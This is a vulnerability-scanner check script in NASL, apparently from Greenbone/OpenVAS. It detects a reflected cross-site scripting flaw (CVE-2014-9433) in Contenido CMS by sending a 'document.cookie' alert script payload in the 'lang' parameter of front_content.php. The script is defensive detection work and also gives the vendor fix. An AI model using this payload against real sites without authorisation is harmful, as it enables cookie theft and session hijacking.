if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805231" );
	script_version( "2020-10-29T15:35:19+0000" );
	script_cve_id( "CVE-2014-9433" );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-10-29 15:35:19 +0000 (Thu, 29 Oct 2020)" );
	script_tag( name: "creation_date", value: "2014-12-26 15:09:14 +0530 (Fri, 26 Dec 2014)" );
	script_name( "Contenido CMS Multiple Parameter Cross-Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/61396" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/129713" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Dec/111" );
	script_tag( name: "summary", value: "This host is installed with Contenido CMS
  and is prone to multiple cross-site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws exist as input passed via
  the 'idart', 'lang', or 'idcat' GET parameters to cms/front_content.php
  script is not properly sanitised before being returned to the user within the
  'checkParams' function." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "Contenido CMS versions 4.9.x through 4.9.5" );
	script_tag( name: "solution", value: "Upgrade to Contenido CMS version 4.9.6 or
  later." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.contenido.org/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
cmsPort = http_get_port( default: 80 );
if(!http_can_host_php( port: cmsPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/contenido", "/cms", http_cgi_dirs( port: cmsPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: dir + "/front_content.php", port: cmsPort );
	res = http_keepalive_send_recv( port: cmsPort, data: req );
	if(res && ( IsMatchRegexp( res, "content=.CMS CONTENIDO" ) || ContainsString( res, "front_content.php?idcat=" ) )){
		url = dir + "/front_content.php?idcat=&lang=<script>alert(document.c" + "ookie)</script>";
		if(http_vuln_check( port: cmsPort, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
			report = http_report_vuln_url( port: cmsPort, url: url );
			security_message( port: cmsPort, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

